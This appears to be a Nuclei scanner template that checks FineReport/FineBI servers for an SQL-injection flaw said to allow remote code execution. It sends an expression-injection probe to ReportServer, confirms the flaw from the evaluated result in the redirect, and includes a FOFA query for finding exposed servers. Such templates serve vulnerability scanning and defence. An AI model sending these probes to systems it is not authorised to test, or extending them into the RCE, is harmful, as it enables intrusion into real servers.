id: finereport-sqli-rce

info:
  name: 帆软 FineReport SQL注入导致远程命令执行
  author: adeljck
  severity: critical
  description: |
    帆软 FineReport / FineBI ReportServer 参数 n 可执行 SQL，sqlite-jdbc 驱动可被滥用导致远程代码执行。部分站点部署在 /decision，不含 /webroot。
  reference:
    - https://github.com/wy876/POC/blob/main/%E5%B8%86%E8%BD%AF%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4RCE.md
  metadata:
    max-request: 2
    verified: true
    fofa-query: app="帆软-FineReport" || title="FineBI"
  tags: finereport,finebi,rce,sqli,vuln

variables:
  string: '{{rand_base(8, "abc")}}'

http:
  - raw:
      - |
        GET {{base}}/view/ReportServer?{{string}}=&n=${sum(1024,123)} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    payloads:
      base:
        - "/webroot/decision"
        - "/decision"
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: location
        words:
          - 'report?{{string}}&n=1147'

      - type: status
        status:
          - 200
          - 302
